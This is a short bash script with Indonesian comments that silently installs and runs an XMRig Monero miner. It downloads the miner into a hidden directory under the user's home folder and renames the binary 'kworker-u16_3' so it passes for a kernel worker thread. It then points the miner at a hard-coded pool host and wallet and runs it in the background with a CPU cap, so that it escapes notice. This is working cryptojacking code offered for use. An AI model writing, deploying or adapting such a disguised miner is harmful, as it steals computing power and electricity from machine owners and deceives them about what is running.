#!/bin/bash

# === CONFIG ===
WALLET="85MLqXJjpZEUPjo9UFtWQ1C5zs3NDx7gJTRVkLefoviXbNN6CyDLKbBc3a1SdS7saaXPoPrxyTxybAnyJjYXKcFBKCJSbDp"  # Ganti wallet Monero kamu
POOL="mimikok.dpdns.org:443"                                          
WORKER="kworker-u16_3"                                                 
CPU_LIMIT=80                                                            

# === DIRECTORY SETUP ===
WORKDIR="$HOME/.local/.xmrig"
mkdir -p "$WORKDIR"
cd "$WORKDIR" || exit 1

# === DOWNLOAD XMRIG ===
if [ ! -f "$WORKDIR/$WORKER" ]; then
  echo "[*] Mengunduh XMRig..."
  curl -LO https://github.com/xmrig/xmrig/releases/latest/download/xmrig-*-linux-x64.tar.gz
  tar -xzf xmrig-*-linux-x64.tar.gz
  cp xmrig-*-linux-x64/xmrig "$WORKER"
  chmod +x "$WORKER"
fi

# === BUAT CONFIG ===
cat > config.json <<EOF
{
  "autosave": true,
  "cpu": {
    "enabled": true,
    "max-threads-hint": 100,
    "priority": 5
  },
  "pools": [
    {
      "url": "$POOL",
      "user": "$WALLET",
      "pass": "x",
      "keepalive": true,
      "tls": false
    }
  ],
  "randomx": {
    "1gb-pages": false
  },
  "donate-level": 1
}
EOF

# === JALANKAN MINER DENGAN PENYAMARAN DAN PEMBATAS CPU ===
echo "[*] Menjalankan miner dengan nama proses: $WORKER (tanpa root, CPU $CPU_LIMIT%)"
cpulimit -l "$CPU_LIMIT" --background -- "$WORKDIR/$WORKER" -c "$WORKDIR/config.json" --background

echo "[+] Done. Jalankan 'ps aux | grep $WORKER' untuk melihat prosesnya."
